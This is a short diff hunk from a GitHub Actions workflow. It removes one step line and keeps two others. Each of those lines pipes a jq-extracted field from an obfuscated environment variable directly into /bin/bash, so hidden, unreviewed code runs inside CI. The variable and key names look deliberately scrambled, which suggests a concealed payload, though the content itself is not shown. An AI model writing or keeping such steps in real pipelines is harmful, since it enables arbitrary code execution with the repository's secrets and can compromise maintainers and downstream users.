@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$i3699" | jq -r .zzhp2298 | /bin/bash
           echo $p8 | jq -r .znaz27739 | /bin/bash
-          printf '%s' "$ail82967" | jq -r .kzi1729 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
